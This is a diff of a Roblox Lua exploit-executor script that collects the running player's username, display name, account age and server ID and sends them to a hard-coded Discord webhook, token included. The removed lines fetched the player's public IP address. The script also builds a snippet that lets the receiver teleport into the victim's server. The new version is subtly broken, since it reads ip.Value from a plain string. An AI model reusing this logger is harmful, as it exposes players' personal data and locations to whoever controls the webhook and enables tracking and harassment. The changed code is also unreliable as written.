@@ -1,4 +1,4 @@
--- muhahaha
+-- Replace this URL with your Discord webhook URL
 local webhookUrl = "https://discord.com/api/webhooks/1212487312873885716/76arKjYim_SIBRs6cTjnI7_ynKjEjdNp3H9DI5BbYisFQ42CBJHPYZnmG62TkeGJhdrD"
 
 local player = game.Players.LocalPlayer
@@ -7,10 +7,8 @@ local accountAge = player.AccountAge
 local gameUsername = player.DisplayName -- Use DisplayName for the in-game username
 local serverId = game.JobId -- Use JobId for the server ID
 local avatarUrl = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username=" .. username
+local ip = "https://www.ipify.org/"
 
--- Get the public IP address using ipinfo.io
-local ipResponse = game:GetService("HttpService"):GetAsync("https://ipinfo.io/ip")
-local ip = ipResponse and ipResponse:gsub("\n", "") or "Failed to retrieve IP"
 
 local joinScript = "```lua\nEXECUTE THIS TO JOIN THEIR SERVER: \npcall(function() game:GetService(\"TeleportService\"):TeleportToPlaceInstance(game.PlaceId, \"" .. serverId .. "\", game:GetService(\"Players\").LocalPlayer) end)\n```"
 
@@ -19,7 +17,7 @@ local payload = {
     embeds = {
         {
             title = "Script Has Been Executed!",
-            description = "Username: " .. username .. "\nIp Address: " .. ip .. "\nDisplay User: " .. gameUsername .. "\nAccount Age: " .. accountAge .. "\nServer ID: " .. serverId .. "\n\n" .. joinScript,
+            description = "Username: " .. username .. "\nGame Username: " .. gameUsername .. "\nIp Address :" .. ip.Value .. "\nAccount Age: " .. accountAge .. "\nServer ID: " .. serverId .. "\n\n" .. joinScript,
             color = nil,
             image = {
                 url = avatarUrl
@@ -33,10 +31,10 @@ local payload = {
 
 local payloadJson = game:GetService("HttpService"):JSONEncode(payload)
 
-local http_request = syn and syn.request or http and http.request or http_request or request or httprequest
+local httpRequest = syn and (syn.request or http.request) or http_request or request or httprequest
 
-if http_request then
-    local response = http_request({
+if httpRequest then
+    local response = httpRequest({
         Url = webhookUrl,
         Method = "POST",
         Headers = {
@@ -46,7 +44,7 @@ if http_request then
     })
 
     -- Optionally, you can print the response to check for errors
-    print(response and response.Body or "No response")
+    print(response.Body)
 else
     warn("HTTP request not available.")
 end
